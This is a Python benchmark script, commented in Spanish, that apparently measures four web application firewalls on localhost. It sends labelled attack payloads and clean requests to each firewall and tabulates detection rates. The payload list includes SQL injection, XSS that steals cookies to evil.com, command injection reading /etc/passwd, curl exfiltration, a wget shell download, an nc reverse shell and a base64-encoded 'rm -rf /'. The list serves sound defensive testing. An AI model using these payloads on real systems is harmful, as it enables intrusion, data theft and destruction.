#!/usr/bin/env python3
"""
benchmark/run_comparative.py — Ejecuta los 92 ataques de validación contra 
los 4 WAFs (WAF-ML, ModSecurity, Coraza, NAXSI) y genera tabla comparativa.

Uso:
  python3 benchmark/run_comparative.py
"""

import csv, json, math, os, sys, time
from datetime import datetime
from collections import defaultdict

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
try:
    import requests
except ImportError:
    print("ERROR: pip install requests"); sys.exit(1)

OUTPUT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "results")

WAFS = [
    {"name": "WAF-ML",      "url": "http://localhost:80",   "desc": "Propio — Ensemble LGBM+MLP (proxy directo)"},
    {"name": "ModSecurity", "url": "http://localhost:8081", "desc": "OWASP CRS Paranoia Level 1"},
    {"name": "Coraza",      "url": "http://localhost:8082", "desc": "Coraza WAF + Caddy + CRS"},
    {"name": "NAXSI",       "url": "http://localhost:8083", "desc": "nginx + NAXSI module"},
]

# ── 92 ataques (mismos que run_validation.py) ────────────────────
VALIDATION_ATTACKS = [
    # CWE-89 — SQLi (15)
    ("CWE-89", "SQLi_login_or_classic",     "POST", "/api/v1/auth/login",        None, {"email": "' OR '1'='1", "password": "x"}),
    ("CWE-89", "SQLi_login_drop_table",     "POST", "/api/v1/auth/login",        None, {"email": "'; DROP TABLE users;--", "password": "x"}),
    ("CWE-89", "SQLi_login_union_select",   "POST", "/api/v1/auth/login",        None, {"email": "' UNION SELECT null,email,password FROM users--", "password": "x"}),
    ("CWE-89", "SQLi_login_admin_comment",  "POST", "/api/v1/auth/login",        None, {"email": "admin'--", "password": "x"}),
    ("CWE-89", "SQLi_login_uppercase",      "POST", "/api/v1/auth/login",        None, {"email": "' OR 1=1 OR 'a'='a", "password": "x"}),
    ("CWE-89", "SQLi_clients_or_1eq1",      "GET",  "/api/v1/clients",           {"search": "' OR 1=1--"}, None),
    ("CWE-89", "SQLi_clients_stacked",      "GET",  "/api/v1/clients",           {"search": "1'; SELECT pg_sleep(5)--"}, None),
    ("CWE-89", "SQLi_products_tautology",   "GET",  "/api/v1/products",          {"search": "' OR '1'='1"}, None),
    ("CWE-89", "SQLi_products_union_v2",    "GET",  "/api/v1/products",          {"search": "' UNION SELECT username,password,3 FROM admins--"}, None),
    ("CWE-89", "SQLi_persons_or_1eq1",      "GET",  "/api/v1/persons/find",      {"document": "' OR 1=1--"}, None),
    ("CWE-89", "SQLi_persons_boolean",      "GET",  "/api/v1/persons/find",      {"document": "1' AND '1'='1"}, None),
    ("CWE-89", "SQLi_suppliers_stacked",    "GET",  "/api/v1/suppliers",         {"search": "1; SELECT * FROM users--"}, None),
    ("CWE-89", "SQLi_suppliers_blind_time", "GET",  "/api/v1/suppliers",         {"search": "1' AND SLEEP(5)--"}, None),
    ("CWE-89", "SQLi_brands_having",        "GET",  "/api/v1/brands",            {"search": "' GROUP BY id HAVING 1=1--"}, None),
    ("CWE-89", "SQLi_categories_order_by",  "GET",  "/api/v1/categories",        {"search": "' ORDER BY 10--"}, None),
    # CWE-564 — SQLi ORM (10)
    ("CWE-564", "SQLi_ORM_hex_encode",      "POST", "/api/v1/auth/login", None, {"email": "0x61646d696e2740", "password": "x"}),
    ("CWE-564", "SQLi_ORM_inline_comment",  "GET",  "/api/v1/clients",    {"search": "' OR/**/1=1--"}, None),
    ("CWE-564", "SQLi_ORM_url_encoded",     "GET",  "/api/v1/products",   {"search": "%27%20OR%20%271%27%3D%271"}, None),
    ("CWE-564", "SQLi_ORM_tautology_alt",   "POST", "/api/v1/auth/login", None, {"email": "' OR 'x'='x", "password": "x"}),
    ("CWE-564", "SQLi_ORM_double_encoded",  "GET",  "/api/v1/clients",    {"search": "%2527%2520OR%25201%253D1"}, None),
    ("CWE-564", "SQLi_ORM_concat_function", "GET",  "/api/v1/products",   {"search": "' || (SELECT password FROM users LIMIT 1) || '"}, None),
    ("CWE-564", "SQLi_ORM_hql_injection",   "GET",  "/api/v1/clients",    {"search": "' or 1=1 or ''='"}, None),
    ("CWE-564", "SQLi_ORM_nested_select",   "GET",  "/api/v1/suppliers",  {"search": "' AND (SELECT 1 FROM users WHERE username='admin')--"}, None),
    ("CWE-564", "SQLi_ORM_cast_bypass",     "GET",  "/api/v1/products",   {"search": "' AND CAST(1 AS INT)=1--"}, None),
    ("CWE-564", "SQLi_ORM_mixed_case",      "POST", "/api/v1/auth/login", None, {"email": "' uNiOn SeLeCt null,null--", "password": "x"}),
    # CWE-79 — XSS Ref (15)
    ("CWE-79", "XSS_script_tag_basic",      "GET",  "/api/v1/clients",     {"search": "<script>alert('xss')</script>"}, None),
    ("CWE-79", "XSS_img_onerror",           "GET",  "/api/v1/products",    {"search": "<img src=x onerror=alert(1)>"}, None),
    ("CWE-79", "XSS_javascript_uri",        "GET",  "/api/v1/clients",     {"search": "javascript:alert(document.cookie)"}, None),
    ("CWE-79", "XSS_iframe_inject",         "GET",  "/api/v1/suppliers",   {"search": "<iframe src='javascript:alert(1)'>"}, None),
    ("CWE-79", "XSS_svg_onload",            "GET",  "/api/v1/products",    {"search": "<svg onload=alert(1)>"}, None),
    ("CWE-79", "XSS_body_onload",           "GET",  "/api/v1/clients",     {"search": "<body onload=alert(1)>"}, None),
    ("CWE-79", "XSS_input_autofocus",       "GET",  "/api/v1/products",    {"search": "<input autofocus onfocus=alert(1)>"}, None),
    ("CWE-79", "XSS_uppercase_script",      "GET",  "/api/v1/clients",     {"search": "<SCRIPT>alert(1)</SCRIPT>"}, None),
    ("CWE-79", "XSS_html_entity_encoded",   "GET",  "/api/v1/products",    {"search": "&#60;script&#62;alert(1)&#60;/script&#62;"}, None),
    ("CWE-79", "XSS_url_encoded_script",    "GET",  "/api/v1/clients",     {"search": "%3Cscript%3Ealert(1)%3C%2Fscript%3E"}, None),
    ("CWE-79", "XSS_detail_event",          "GET",  "/api/v1/suppliers",   {"search": "<details open ontoggle=alert(1)>"}, None),
    ("CWE-79", "XSS_marquee_event",         "GET",  "/api/v1/products",    {"search": "<marquee onstart=alert(1)>"}, None),
    ("CWE-79", "XSS_video_onerror",         "GET",  "/api/v1/clients",     {"search": "<video src=x onerror=alert(1)>"}, None),
    ("CWE-79", "XSS_post_body_field",       "POST", "/api/v1/clients",     None, {"name": "<script>fetch('http://evil.com?c='+document.cookie)</script>", "email": "x@x.com"}),
    ("CWE-79", "XSS_object_data",           "GET",  "/api/v1/suppliers",   {"search": "<object data=javascript:alert(1)>"}, None),
    # CWE-80 — XSS Basic (10)
    ("CWE-80", "XSS_basic_exfil_cookie",    "GET",  "/api/v1/inventories", {"search": "<script>document.location='http://evil.com?c='+document.cookie</script>"}, None),
    ("CWE-80", "XSS_basic_body_field",      "POST", "/api/v1/clients",     None, {"name": "<script>alert(1)</script>", "email": "test@test.com"}),
    ("CWE-80", "XSS_basic_brands_field",    "GET",  "/api/v1/brands",      {"search": "<script>alert('XSS')</script>"}, None),
    ("CWE-80", "XSS_basic_categories",      "GET",  "/api/v1/categories",  {"search": "<script>alert(document.domain)</script>"}, None),
    ("CWE-80", "XSS_basic_warehouses",      "GET",  "/api/v1/warehouses",  {"search": "<script>alert(1)</script>"}, None),
    ("CWE-80", "XSS_basic_no_quotes",       "GET",  "/api/v1/products",    {"search": "<script>alert(String.fromCharCode(88,83,83))</script>"}, None),
    ("CWE-80", "XSS_basic_lowercase_tag",   "GET",  "/api/v1/clients",     {"search": "<script src=//evil.com/x.js></script>"}, None),
    ("CWE-80", "XSS_basic_contact_msg",     "POST", "/api/v1/contact",     None, {"name": "Juan", "email": "j@test.com", "message": "<script>alert(1)</script>"}),
    ("CWE-80", "XSS_basic_persons_doc",     "GET",  "/api/v1/persons/find",{"document": "<script>alert(1)</script>"}, None),
    ("CWE-80", "XSS_basic_double_tag",      "GET",  "/api/v1/products",    {"search": "<scr<script>ipt>alert(1)</scr</script>ipt>"}, None),
    # CWE-83 — XSS Atributo (10)
    ("CWE-83", "XSS_attr_onerror_quote",    "GET",  "/api/v1/products",    {"search": "\" onerror=\"alert(1)\""}, None),
    ("CWE-83", "XSS_attr_onmouseover",      "GET",  "/api/v1/clients",     {"search": "x\" onmouseover=\"alert(1)\""}, None),
    ("CWE-83", "XSS_attr_style_url",        "POST", "/api/v1/clients",     None, {"name": "x\" style=\"background:url(javascript:alert(1))\""}),
    ("CWE-83", "XSS_attr_href_onclick",     "GET",  "/api/v1/suppliers",   {"search": "\" href=\"javascript:void(0)\" onclick=\"alert(1)\""}, None),
    ("CWE-83", "XSS_attr_single_quote",     "GET",  "/api/v1/products",    {"search": "' onfocus='alert(1)' autofocus='"}, None),
    ("CWE-83", "XSS_attr_close_tag",        "GET",  "/api/v1/clients",     {"search": "\"><script>alert(1)</script>"}, None),
    ("CWE-83", "XSS_attr_data_uri",         "GET",  "/api/v1/products",    {"search": "\" src=\"data:text/html,<script>alert(1)</script>\""}, None),
    ("CWE-83", "XSS_attr_formaction",       "GET",  "/api/v1/suppliers",   {"search": "\" formaction=\"javascript:alert(1)"}, None),
    ("CWE-83", "XSS_attr_value_break",      "POST", "/api/v1/clients",     None, {"name": "test\" value=\"x\" onfocus=\"alert(1)"}),
    ("CWE-83", "XSS_attr_backtick",         "GET",  "/api/v1/products",    {"search": "`onmouseover=alert(1)`"}, None),
    # CWE-77 — CMD genérico (10)
    ("CWE-77", "CMD_pipe_ls",               "GET",  "/api/v1/persons/find",{"document": "12345678 | ls -la"}, None),
    ("CWE-77", "CMD_semicolon_passwd",      "GET",  "/api/v1/persons/find",{"document": "12345678; cat /etc/passwd"}, None),
    ("CWE-77", "CMD_backtick_id",           "GET",  "/api/v1/clients",     {"search": "`id`"}, None),
    ("CWE-77", "CMD_subshell_whoami",       "POST", "/api/v1/auth/login",  None, {"email": "$(whoami)@test.com", "password": "x"}),
    ("CWE-77", "CMD_double_pipe",           "GET",  "/api/v1/persons/find",{"document": "12345678 || whoami"}, None),
    ("CWE-77", "CMD_and_operator",          "GET",  "/api/v1/clients",     {"search": "test && cat /etc/shadow"}, None),
    ("CWE-77", "CMD_newline_inject",        "GET",  "/api/v1/persons/find",{"document": "12345678\nid"}, None),
    ("CWE-77", "CMD_subshell_uname",        "GET",  "/api/v1/suppliers",   {"search": "$(uname -a)"}, None),
    ("CWE-77", "CMD_powershell_style",      "POST", "/api/v1/auth/login",  None, {"email": "test; Get-Process@test.com", "password": "x"}),
    ("CWE-77", "CMD_env_var_leak",          "GET",  "/api/v1/products",    {"search": "$PATH; env"}, None),
    # CWE-78 — OS Command (12)
    ("CWE-78", "OS_upload_path_traversal",  "POST", "/api/v1/repository/upload-file",     None, {"filename": "../../etc/passwd; ls"}),
    ("CWE-78", "OS_path_traversal_deep",    "GET",  "/api/v1/repository/getForClient/1",  {"path": "../../../../etc/passwd"}, None),
    ("CWE-78", "OS_exec_php_func",          "POST", "/api/v1/auth/login",  None, {"email": "test@test.com; phpinfo()", "password": "x"}),
    ("CWE-78", "OS_xp_cmdshell",            "GET",  "/api/v1/products",    {"search": "'; exec xp_cmdshell('dir')--"}, None),
    ("CWE-78", "OS_windows_traversal",      "GET",  "/api/v1/repository/getForClient/1",  {"path": "..\\..\\..\\windows\\win.ini"}, None),
    ("CWE-78", "OS_null_byte_bypass",       "GET",  "/api/v1/repository/getForClient/1",  {"path": "../../etc/passwd%00.jpg"}, None),
    ("CWE-78", "OS_double_url_encode",      "GET",  "/api/v1/repository/getForClient/1",  {"path": "%252e%252e%252fetc%252fpasswd"}, None),
    ("CWE-78", "OS_upload_double_ext",      "POST", "/api/v1/repository/upload-file",     None, {"filename": "shell.php.jpg; rm -rf /"}),
    ("CWE-78", "OS_curl_exfil",             "GET",  "/api/v1/clients",     {"search": "; curl http://evil.com/$(cat /etc/passwd)"}, None),
    ("CWE-78", "OS_wget_download",          "GET",  "/api/v1/suppliers",   {"search": "; wget http://evil.com/shell.sh -O /tmp/s.sh"}, None),
    ("CWE-78", "OS_nc_reverse_shell",       "GET",  "/api/v1/products",    {"search": "; nc -e /bin/sh evil.com 4444"}, None),
    ("CWE-78", "OS_base64_decode_exec",     "POST", "/api/v1/auth/login",  None, {"email": "x; echo cm0gLXJmIC8= | base64 -d | sh", "password": "x"}),
    # CWE-93 — CRLF (10)
    ("CWE-93", "CRLF_header_inject_encoded","GET",  "/api/v1/clients",     {"search": "test%0d%0aX-Injected: malicious"}, None),
    ("CWE-93", "CRLF_redirect_raw",         "GET",  "/api/v1/products",    {"search": "test\r\nLocation: http://evil.com"}, None),
    ("CWE-93", "CRLF_cookie_inject",        "POST", "/api/v1/auth/login",  None, {"email": "test@t.com\r\nSet-Cookie: session=hacked", "password": "x"}),
    ("CWE-93", "CRLF_double_split_xss",     "GET",  "/api/v1/suppliers",   {"search": "x%0d%0a%0d%0a<script>alert(1)</script>"}, None),
    ("CWE-93", "CRLF_lowercase_encoded",    "GET",  "/api/v1/clients",     {"search": "test%0D%0AX-Forwarded-For: 127.0.0.1"}, None),
    ("CWE-93", "CRLF_http_response_split",  "GET",  "/api/v1/products",    {"search": "a%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK"}, None),
    ("CWE-93", "CRLF_log_injection",        "POST", "/api/v1/auth/login",  None, {"email": "admin\r\n[FAKE] login success", "password": "x"}),
    ("CWE-93", "CRLF_cache_poison",         "GET",  "/api/v1/clients",     {"search": "test%0d%0aX-Cache-Control: no-cache"}, None),
    ("CWE-93", "CRLF_unicode_variant",      "GET",  "/api/v1/suppliers",   {"search": "test%E5%98%8A%E5%98%8DSet-Cookie:%20x=1"}, None),
    ("CWE-93", "CRLF_partial_encoded",      "GET",  "/api/v1/products",    {"search": "test\r%0aX-Injected: yes"}, None),
]

# ── 132 clean cases (mismos que run_validation.py) ──────────────
PRODUCT_NAMES = ["laptop","notebook","mouse","keyboard","monitor","chair","desk","cable","adapter","battery","charger","phone","tablet","case","headset","speaker","webcam","printer","scanner","paper","toner","cable usb","mouse pad","hub usb","ssd 256","memoria ram","disco duro","memoria usb","audifonos","cargador","teclado","parlantes","mesa","silla","escritorio","oficina","computadora","servidor","rack","switch","router","licencia office","antivirus","vpn"]
CLIENT_TERMS = ["Garcia","Lopez","Martinez","Rodriguez","Fernandez","Gonzalez","Perez","Sanchez","Ramirez","Torres","Flores","Rivera","Castillo","Reyes","Gomez","Diaz","Vargas","Romero","Santos","Morales","Alvarez","Romero","Ortiz","Silva","Mendoza","Castro","Gutierrez","Vega","Cruz","Rojas"]
BRAND_NAMES = ["Sony","Samsung","LG","HP","Dell","Lenovo","Apple","Microsoft"]
CATEGORIES = ["electronica","computacion","oficina","impresion"]
SUPPLIER_TERMS = ["Grupo Atel","Distribuidora Nacional","Comercial ABC","Importaciones XYZ","Logistica Total","Suministros SA"]
INVENTORY_TERMS = ["disponible","stock","agotado","bajo stock","en transito"]

def send(waf_url, method, path, params=None, data=None, json_body=None, headers=None):
    hdrs = {"Accept": "application/json"}
    if headers: hdrs.update(headers)
    if json_body: hdrs.setdefault("Content-Type", "application/json")
    try:
        url = f"{waf_url}{path}"
        if json_body:
            r = requests.request(method, url, params=params, json=json_body, headers=hdrs, timeout=8, allow_redirects=False)
        else:
            r = requests.request(method, url, params=params, data=data, headers=hdrs, timeout=8, allow_redirects=False)
        return r.status_code, r.headers.get("X-WAF-Action"), None
    except Exception as e:
        return 502, None, str(e)

def build_clean_cases():
    cases = []
    for n in PRODUCT_NAMES:
        cases.append(("CLEAN","GET","/api/v1/products",{"search":n},None,None,None))
    for t in CLIENT_TERMS:
        cases.append(("CLEAN","GET","/api/v1/clients",{"search":t},None,None,None))
    for d in range(10000001, 10000011):
        cases.append(("CLEAN","GET","/api/v1/persons/find",{"document":str(d)},None,None,None))
    for b in BRAND_NAMES:
        cases.append(("CLEAN","GET","/api/v1/brands",{"search":b},None,None,None))
    for c in CATEGORIES:
        cases.append(("CLEAN","GET","/api/v1/categories",{"search":c},None,None,None))
    for s in SUPPLIER_TERMS:
        cases.append(("CLEAN","GET","/api/v1/suppliers",{"search":s},None,None,None))
    for t in INVENTORY_TERMS:
        cases.append(("CLEAN","GET","/api/v1/inventories",{"search":t},None,None,None))
    for wid in [1,2,3]:
        cases.append(("CLEAN","GET","/api/v1/warehouses",{"id":str(wid)},None,None,None))
    for page,limit in [(1,10),(2,10),(1,25),(2,25),(1,50),(3,10)]:
        cases.append(("CLEAN","GET","/api/v1/products",{"page":str(page),"limit":str(limit)},None,None,None))
    for email,pw in [("admin@atel.com","password123"),("user@test.com","pass1234"),("ventas@atel.com","Ventas2026!"),("soporte@atel.com","S0p0rt3#"),("compras@atel.com","Compras.2026")]:
        cases.append(("CLEAN","POST","/api/v1/auth/login",None,{"email":email,"password":pw},None,None))
    cases.append(("CLEAN","POST","/api/v1/auth/login",None,None,{"email":"admin@atel.com","password":"test123"},None))
    cases.append(("CLEAN","POST","/api/v1/contact",None,None,{"name":"Juan","email":"juan@test.com","message":"consulta"},None))
    cases.append(("CLEAN","POST","/api/v1/clients",None,None,{"name":"Empresa SAC","email":"contacto@empresa.com"},None))
    for ua_name,ua_val in [("Chrome","Mozilla/5.0 Chrome/125.0"),("Firefox","Mozilla/5.0 Firefox/127.0"),("Safari","Mozilla/5.0 iPhone")]:
        cases.append(("CLEAN","GET","/api/v1/products",{"limit":"5"},None,None,{"User-Agent":ua_val}))
    for txt in ["D'Onofrio","Hernández","São Paulo","München","café"]:
        cases.append(("CLEAN","GET","/api/v1/clients",{"search":txt},None,None,None))
    return cases

def run_suite(waf, cases):
    results = []
    for idx, case in enumerate(cases, 1):
        if len(case) == 7:  # attack: (cwe, desc, method, path, params, data, json_body)
            cwe, desc, method, path, params, data, json_body = case
        else:  # clean: (cwe, method, path, params, data, json_body, headers)
            cwe, method, path, params, data, json_body, _ = case
            desc = cwe
        status, waf_action, error = send(waf["url"], method, path, params, data, json_body)
        expected = "BLOCK" if cwe != "CLEAN" else "ALLOW"
        blocked = status == 403
        logged = waf_action == "LOG"
        if expected == "BLOCK":
            result = "TP" if (blocked or logged) else "FN"
        else:
            result = "TN" if (not blocked and not logged) else "FP"
        results.append({"cwe": cwe, "desc": desc, "expected": expected, "result": result, "status": status})
    return results

def main():
    print(f"\n{'═'*70}")
    print(f"  COMPARATIVA 4 WAFs — 92 ataques + 132 limpios")
    print(f"  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{'═'*70}")

    # Check health
    for waf in WAFS:
        try:
            r = requests.get(f"{waf['url']}/health", timeout=5)
            ok = r.status_code in (200, 404)
        except:
            ok = False
        print(f"  {'✅' if ok else '❌'} {waf['name']:<15s} → {waf['url']:<25s} {'RESPONDE' if ok else 'SIN RESPUESTA'}")

    # Build cases
    attack_cases = [(cwe, desc, method, path, params, data, None) for cwe, desc, method, path, params, data in VALIDATION_ATTACKS]
    clean_cases = build_clean_cases()
    all_cases = attack_cases + clean_cases

    print(f"\n  Ataques: {len(attack_cases)}  |  Limpios: {len(clean_cases)}  |  Total: {len(all_cases)}")
    print(f"  WAFs: {', '.join(w['name'] for w in WAFS)}")
    print()

    # Run against each WAF
    all_by_waf = {}
    for waf in WAFS:
        print(f"  ▶  {waf['name']}...")
        r = run_suite(waf, all_cases)
        all_by_waf[waf['name']] = r

    # Compute metrics
    print(f"\n{'═'*70}")
    print(f"  📊 TABLA COMPARATIVA — 92 ATAQUES + 132 LIMPIOS")
    print(f"{'═'*70}")
    print(f"  {'WAF':<16} {'TP':>4} {'TN':>4} {'FP':>4} {'FN':>4} {'Recall':>7} {'FPR':>7} {'DetAcc':>7}")
    print(f"  {'─'*56}")

    for waf in WAFS:
        r = all_by_waf[waf['name']]
        attacks = [x for x in r if x['expected'] == 'BLOCK']
        clean = [x for x in r if x['expected'] == 'ALLOW']
        tp = sum(1 for x in attacks if x['result'] == 'TP')
        fn = sum(1 for x in attacks if x['result'] == 'FN')
        tn = sum(1 for x in clean if x['result'] == 'TN')
        fp = sum(1 for x in clean if x['result'] == 'FP')
        total = len(r)
        recall = tp/(tp+fn)*100 if (tp+fn) else 0
        fpr = fp/(fp+tn)*100 if (fp+tn) else 0
        detacc = (tp+tn)/total*100 if total else 0
        print(f"  {waf['name']:<16} {tp:>4} {tn:>4} {fp:>4} {fn:>4} {recall:>6.1f}% {fpr:>6.1f}% {detacc:>6.1f}%")

    # Recall by CWE for each WAF
    print(f"\n{'═'*70}")
    print(f"  📊 RECALL POR CWE")
    print(f"{'═'*70}")
    cwes = sorted(set(cwe for cwe,_,_,_,_,_,_ in attack_cases))
    header = f"  {'CWE':<10}"
    for waf in WAFS:
        header += f" {waf['name']:>12}"
    print(header)
    print(f"  {'─'*58}")
    for cwe in cwes:
        line = f"  {cwe:<10}"
        for waf in WAFS:
            r = all_by_waf[waf['name']]
            cwe_attacks = [x for x in r if x['cwe'] == cwe and x['expected'] == 'BLOCK']
            t = len(cwe_attacks)
            tp = sum(1 for x in cwe_attacks if x['result'] == 'TP')
            rec = tp/t*100 if t else 0
            line += f" {rec:>10.1f}%  "
        print(line)

    # Export
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    path = os.path.join(OUTPUT_DIR, f"comparativa_4wafs_{ts}.json")
    data = {}
    for waf in WAFS:
        data[waf['name']] = {"config": waf, "results": all_by_waf[waf['name']]}
    with open(path, "w") as f:
        json.dump(data, f, indent=2)
    print(f"\n  📄 JSON → {path}")
    print()

if __name__ == "__main__":
    main()
